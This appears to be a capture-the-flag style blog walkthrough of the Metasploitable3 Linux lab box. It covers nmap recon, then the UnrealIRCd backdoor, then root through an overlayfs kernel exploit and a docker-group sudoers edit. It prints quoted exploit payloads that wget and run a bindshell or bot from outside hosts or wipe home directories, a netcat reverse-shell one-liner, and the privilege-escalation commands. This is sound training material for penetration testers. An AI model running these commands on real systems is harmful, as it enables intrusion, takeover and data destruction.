---
layout: single
title: Metasploitable3 - Exploiting UnrealIRC Service
excerpt: Metasploitable3 is a free vulnerable machine - either in a Linux or Windows version - that allows you to simulate attacks largely using metasploit. For this post, I will try exploiting the IRC service without metasploit and go on to gain root in two different ways
date: 2020-04-08
classes: wide
header:
  teaser: <img src="/assets/images/metasplitable3/metasploit_logo.jpg">
  teaser_home_page: true
  icon: <img src="/assets/images/hackthebox.png">
categories:
  - metasploitable3
tags:
  - irc
  - linux
  - kernel exploits
  - docker
---

<img src="/assets/images/metasploitable3/metasploit_logo.jpg">

## Summary

Metasploitable3 is a free vulnerable machine - either in a Linux or Windows version - that allows you to simulate attacks largely using metasploit. However, I will mainly avoid using metasploit and rather do it manually to further enhance my skillset. I will randomly pick a service to exploit so I can write multiple blogs in this metasploitable 3 series. In this blog, we will be exploiting UnrealIRC Service to gain a shell and use 2 different ways to escalate privilege to root.

## Box Details

- IP Address: 192.168.4.132(Specific to my lab setup)
- OS: Linux, Ubuntu 14.04
- Hostname: metasploitable3-linux
- Kali: 192.168.4.129

## Recon

### Nmap Output

```
# nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 192.168.4.132
Nmap scan report for 192.168.4.132
Host is up (0.00049s latency).
Not shown: 65525 filtered ports
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
80/tcp   open   http
445/tcp  open   microsoft-ds
631/tcp  open   ipp
3000/tcp closed ppp
3306/tcp open   mysql
3500/tcp closed rtmp-port
6697/tcp open   ircs-u
8181/tcp open   intermapper
MAC Address: 00:0C:29:BE:58:E2 (VMware)

# Nmap done at Thu May  2 04:40:04 2019 -- 1 IP address (1 host up) scanned in 13.47 seconds
```

Performing a nmap service and version scan on the identified opened ports using default scripts

```
# nmap -sC -sV -p 21,22,80,445,631,3000,3306,3500,6697,8181 -oA nmap/services 192.168.4.132
Nmap scan report for 192.168.4.132
Host is up (0.00058s latency).

PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 b9:07:bc:1e:21:f8:aa:09:7a:f3:66:c9:4c:1e:93:82 (DSA)
|   2048 41:1c:56:97:4e:77:d2:3a:c5:fc:e1:e8:bb:52:c7:58 (RSA)
|   256 6f:3a:67:21:7c:1c:cc:71:f3:f2:33:58:ba:ea:17:0f (ECDSA)
|_  256 31:0c:79:ba:be:a8:ef:8f:0a:f6:bb:45:70:97:b3:9b (ED25519)
80/tcp   open   http        Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-07-29 13:18  chat/
| -     2011-07-27 20:17  drupal/
| 1.7K  2018-07-29 13:18  payroll_app.php
| -     2013-04-08 12:06  phpmyadmin/
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
445/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
| http-methods:
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: CUPS/1.7 IPP/2.1
|_http-title: Home - CUPS 1.7.2
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
3500/tcp closed rtmp-port
6697/tcp open   irc         UnrealIRCd
| irc-info:
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|_  server: irc.TestIRC.net
8181/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.7 (2018-03-28))
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.7/2018-03-28)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 00:0C:29:BE:58:E2 (VMware)
Service Info: Hosts: 127.0.0.1, METASPLOITABLE3-UB1404, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2s, deviation: 2s, median: 0s
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: metasploitable3-ub1404
|   NetBIOS computer name: METASPLOITABLE3-UB1404\x00
|   Domain name: \x00
|   FQDN: metasploitable3-ub1404
|_  System time: 2019-05-02T04:44:27+00:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-05-02 04:44:24
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  2 04:45:22 2019 -- 1 IP address (1 host up) scanned in 67.97 seconds
```

### Looking For Exploits

As can be seen form the nmap output, we can see that the service running on port 6697 is UnrealIRC. We can use `searchsploit` to search for exploits:

```
# searchsploit UnrealIRC
----------------------------------------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                                                             |  Path
                                                                                                           | (/usr/share/exploitdb/)
----------------------------------------------------------------------------------------------------------- ----------------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                               | exploits/linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                    | exploits/windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                             | exploits/linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                  | exploits/windows/dos/27407.pl
----------------------------------------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result
```

I will ignore the windows exploit and examine the exploits for linux systems by using `searchsploit -x` to examine the code: `searchsploit -x exploits/linux/remote/16922.rb`. Towards the bottom, I see this function:

```ruby
def exploit
                connect

                print_status("Connected to #{rhost}:#{rport}...")
                banner = sock.get_once(-1, 30)
                banner.to_s.split("\n").each do |line|
                        print_line("    #{line}")
                end

                print_status("Sending backdoor command...")
                sock.put("AB;" + payload.encoded + "\n")

                handler
                disconnect
        end
```

From the function, it looks like the exploit is to connect to the port and then send "AB;" + the payload + "\n"

Examining the perl script the same way, `searchsploit -x exploits/linux/remote/13853.pl`, we can find the following at the top section

```perl
## Payload options
my $payload1 = 'AB; cd /tmp; wget http://packetstormsecurity.org/groups/synnergy/bindshell-unix -O bindshell; chmod +x bindshell; ./bindshell &';
my $payload2 = 'AB; cd /tmp; wget http://efnetbs.webs.com/bot.txt -O bot; chmod +x bot; ./bot &';
my $payload3 = 'AB; cd /tmp; wget http://efnetbs.webs.com/r.txt -O rshell; chmod +x rshell; ./rshell &';
my $payload4 = 'AB; killall ircd';
my $payload5 = 'AB; cd ~; /bin/rm -fr ~/*;/bin/rm -fr *';
```

It appears to be sending the same payload

## Getting Shell as boba_fett

Based on what I found during the recon stage, I will just connect with `nc` and enter `AB; [some command]` and get it running. I will test with a ping and use tcpdump to listen for icmp traffic:

```
root@cyb3r:~# nc 192.168.4.132 6697
:irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
:irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB;ping -c 1 192.168.4.129
:irc.TestIRC.net 451 AB;ping :You have not registered
```

And in another windows, I can see that my attacker machine receives that pings. This proves that RCE is possible.

```
root@cyb3r:~# tcpdump -ni eth0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
11:20:47.780631 IP 192.168.4.132 > 192.168.4.129: ICMP echo request, id 3340, seq 1, length 64
11:20:47.780684 IP 192.168.4.129 > 192.168.4.132: ICMP echo reply, id 3340, seq 1, length 64
```

Now to get a shell I will use the try and tested command below to receive a reverse shell from the IRC Server

```
root@cyb3r:~# nc 192.168.4.132 6697
:irc.TestIRC.net NOTICE AUTH :*** Looking up your hostname...
:irc.TestIRC.net NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.4.129 443 >/tmp/f
```

And in other window, I receive the shell from the server:

```
root@cyb3r:~# rlwrap nc -lvnp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 192.168.4.132.
Ncat: Connection from 192.168.4.132:33625.
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
boba_fett@metasploitable3-ub1404:/opt/unrealircd/Unreal3.2$ whoami
whoami
boba_fett
boba_fett@metasploitable3-ub1404:/opt/unrealircd/Unreal3.2$

```

## Privilege Escalation

### From boba_fett --> root

In order to gain full root access, further recon is required to find ways in which we can further escalate our current privileges. I usually run the post exploitation scripts such as `LinEnum.sh`, `linux-kernel-exploiter` and `linux-smart-enumeration` script to help automate this stage. First, I need to transfer these scripts to the compromised server and executed them. I will setup a webserver on the attacker machine and use wget to download the files to a location so i can execute them.

```
root@cyb3r:/opt/LinEnum# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.4.132 - - [15/Dec/2019 12:24:25] "GET /LinEnum.sh HTTP/1.1" 200 -

root@cyb3r:/opt/linux-smart-enumeration# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
192.168.4.132 - - [15/Dec/2019 12:24:58] "GET /lse.sh HTTP/1.1" 200 -
```

Using wget to download the files:

```
boba_fett@metasploitable3-ub1404:/var/tmp$ wget http://192.168.4.129/LinEnum.sh
wget http://192.168.4.129/LinEnum.sh
--2019-12-15 12:24:25--  http://192.168.4.129/LinEnum.sh
Connecting to 192.168.4.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 45650 (45K) [text/x-sh]
Saving to: 'LinEnum.sh'

     0K .......... .......... .......... .......... ....      100% 1.04M=0.04s

2019-12-15 12:24:25 (1.04 MB/s) - 'LinEnum.sh' saved [45650/45650]

boba_fett@metasploitable3-ub1404:/var/tmp$ wget http://192.168.4.129/lse.sh
wget http://192.168.4.129/lse.sh
--2019-12-15 12:24:58--  http://192.168.4.129/lse.sh
Connecting to 192.168.4.129:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 31736 (31K) [text/x-sh]
Saving to: 'lse.sh'

     0K .......... .......... ..........                      100% 20.2M=0.002s

2019-12-15 12:24:58 (20.2 MB/s) - 'lse.sh' saved [31736/31736]

boba_fett@metasploitable3-ub1404:/var/tmp$


boba_fett@metasploitable3-ub1404:~$ wget http://192.168.4.129/linux-exploit-suggester-2.pl
--2020-04-08 13:05:21--  http://192.168.4.128/linux-exploit-suggester-2.pl
Connecting to 192.168.4.128:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24783 (24K) [text/x-perl]
Saving to: ‘linux-exploit-suggester-2.pl’

100%[===================================================================================================================>] 24,783      --.-K/s   in 0s      

2020-04-08 13:05:21 (108 MB/s) - ‘linux-exploit-suggester-2.pl’ saved [24783/24783]

boba_fett@metasploitable3-ub1404:~$
```

After running the enumeration scripts, a few things popped out for me:

##### Kernel Exploits - There were some kernel exploits available for this kernel version

```
boba_fett@metasploitable3-ub1404:~$ perl linux-exploit-suggester-2.pl 

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 3.13.0
  Searching 72 exploits...

  Possible Exploits
  [1] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] overlayfs
      CVE-2015-8660
      Source: http://www.exploit-db.com/exploits/39230
  [4] pp_key
      CVE-2016-0728
      Source: http://www.exploit-db.com/exploits/39277
  [5] timeoutpwn
      CVE-2014-0038
      Source: http://www.exploit-db.com/exploits/31346

boba_fett@metasploitable3-ub1404:~$ 
```

##### The user boba_fett belongs the docker group and this can be leaveraged to obtain a root shell if the docker settings aren't properly configured

```
[!] ctn020 Is the user a member of the 'docker' group?..................... yes!
---
docker
---
```

### Gaining root using the kernel exploit overlays(CVE-2015-8660)

We can go ahead and download the overlayfs exploit from [here](http://www.exploit-db.com/exploits/39230), send it over to the victim machine and then use gcc to compile the script to an executable and execute it so as to gain the root shell:

```
boba_fett@metasploitable3-ub1404:~$ wget http://192.168.4.129/overlay.c
wget http://192.168.4.129/overlay.c
--2019-05-03 15:46:08--  http://192.168.4.129/overlay.c
Connecting to 192.168.72.131:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/plain]
Saving to: 'overlay.c'

100%[======================================>] 5,119       --.-K/s   in 0s      

2019-05-03 15:46:09 (93.7 MB/s) - 'overlay.c' saved [5119/5119]

boba_fett@metasploitable3-ub1404:~$ gcc overlay.c -o ofs
gcc overlay.c -o ofs

boba_fett@metasploitable3-ub1404:~$ chmod +x ofs
chmod +x ofs
boba_fett@metasploitable3-ub1404:~$ ./ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
id
uid=0(root) gid=0(root) groups=0(root),100(users),999(docker)
# 
```

### Gaining root taking advantage to the docker group

With user `boba_fett` in the docker group, we can issue docker commands without any restrictions. I will use docker command `docker images` to list the docker images on the system

```
boba_fett@metasploitable3-ub1404:~$ docker images
REPOSITORY                  TAG                 IMAGE ID            CREATED             SIZE
7_of_diamonds               latest              5e45125fa132        20 months ago       84.2MB
ubuntu                      latest              735f80812f90        20 months ago       83.5MB
krustyhack/docker-privesc   latest              6b5ae09db018        2 years ago         3.97MB
boba_fett@metasploitable3-ub1404:~$ 
```

From this printout I can see we have an `Ubuntu` image on the system. The attack vector that straight away comes to mind to is to map the `/etc/` directory to a directory `/root/` within the docker container. Within the container, I'll have access as root and be able to add user `boba_fett` into the sudoers file so he can issue all commands with the `sudo` without knowing his password and therefore go on and get a root shell using `sudo bash`.

To run a container and mount the `/etc` directory, I will use the following command, `docker run -dit -v /etc:/root ubuntu` and I can check the running container using `docker ps`

```
boba_fett@metasploitable3-ub1404:~$ docker run -dit -v /etc:/root ubuntu
5918a86e9463068479143edc7217831b17929096a80c82a330d2c3b5c6bfcac6
boba_fett@metasploitable3-ub1404:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
5918a86e9463        ubuntu              "/bin/bash"         16 seconds ago      Up 5 seconds                            cocky_wozniak
753bae4795cf        7_of_diamonds       "/bin/bash"         20 months ago       Up 5 hours                              7_of_diamonds
boba_fett@metasploitable3-ub1404:~$ 

```

We have our ubuntu container with id `5918a86e9463` running. Next step is to connect to our docker container, edit the `sudoers` file and insert details for `boba_fett` to be able to issue commands with sudo without entering his password(which we don't know).

```
boba_fett@metasploitable3-ub1404:~$ docker exec -it 5918a86e9463 /bin/bash
root@5918a86e9463:/# id
uid=0(root) gid=0(root) groups=0(root)
root@5918a86e9463:/# pwd
/
root@5918a86e9463:/# cd /root
root@5918a86e9463:~# cat passwd | grep boba_fett
boba_fett:x:1121:100::/home/boba_fett:/bin/bash
root@5918a86e9463:~#
```

From the printout above, it's clear we have root access in the docker container and have successfully mounted the `/etc/` directory in the `root` directory. A simple grep on the `passwd` file, we found our user's name. 

To edit the `sudoers` file, we will use the `echo` to append the following information to enable user `boba_fett` issue sudo commands without any password: `echo "boba_fett ALL=(ALL) NOPASSWD: ALL" >> sudoers`. We can confirm this has been appended to the file by reading the file using `cat sudoers`.

```
root@5918a86e9463:~# echo "boba_fett ALL=(ALL) NOPASSWD: ALL" >> sudoers
root@5918a86e9463:~# cat sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
boba_fett ALL=(ALL) NOPASSWD: ALL
root@5918a86e9463:~# 
```

With this done, we can exit the container and simply issue `sudo bash` on the host victim to gain a root shell

```
root@5918a86e9463:~# exit
exit
boba_fett@metasploitable3-ub1404:~$ 
boba_fett@metasploitable3-ub1404:~$ id
uid=1121(boba_fett) gid=100(users) groups=100(users),999(docker)
boba_fett@metasploitable3-ub1404:~$ whoami
boba_fett
boba_fett@metasploitable3-ub1404:~$ sudo bash
root@metasploitable3-ub1404:~# id
uid=0(root) gid=0(root) groups=0(root)
root@metasploitable3-ub1404:~# whoami
root
root@metasploitable3-ub1404:~# hostname
metasploitable3-ub1404
root@metasploitable3-ub1404:~# 

```

So, we finally have a shell as root. Hope you enjoyed reading this walkthrough.
